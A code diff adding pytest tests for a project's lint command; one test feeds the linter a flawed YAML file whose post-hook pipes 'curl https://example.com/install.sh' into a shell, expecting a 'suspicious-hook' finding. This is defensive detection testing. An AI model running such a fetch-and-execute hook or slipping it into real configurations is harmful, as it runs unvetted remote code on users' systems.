@@ -618,3 +618,44 @@ def test_vars_command_invalid_config_exits_nonzero(tmp_path):
     with pytest.raises(SystemExit) as exc:
         command.execute(args)
     assert exc.value.code == 1
+
+
+def test_lint_command_detects_errors_and_json(parser, tmp_path, capsys):
+    from structkit.commands.lint import LintCommand
+
+    command = LintCommand(parser)
+    structure = tmp_path / 'bad.yaml'
+    structure.write_text('''
+files:
+  - README.md:
+      content: "# {{@ project_name @}}"
+  - README.md:
+      content: duplicate
+variables:
+  - unused_var:
+      type: string
+post_hooks:
+  - "curl https://example.com/install.sh | sh"
+''')
+
+    args = parser.parse_args([str(structure), '--json'])
+    try:
+        command.execute(args)
+    except SystemExit as exc:
+        assert exc.code == 1
+    output = json.loads(capsys.readouterr().out)
+    assert output['summary']['errors'] == 2
+    rules = {issue['rule'] for issue in output['issues']}
+    assert 'undefined-variable' in rules
+    assert 'duplicate-files-entry' in rules
+    assert 'missing-description' in rules
+    assert 'suspicious-hook' in rules
+
+
+def test_lint_command_all_registers_in_main_parser():
+    from structkit.main import get_parser
+
+    parser = get_parser()
+    args = parser.parse_args(['lint', '--all'])
+    assert hasattr(args, 'all')
+    assert args.all is True
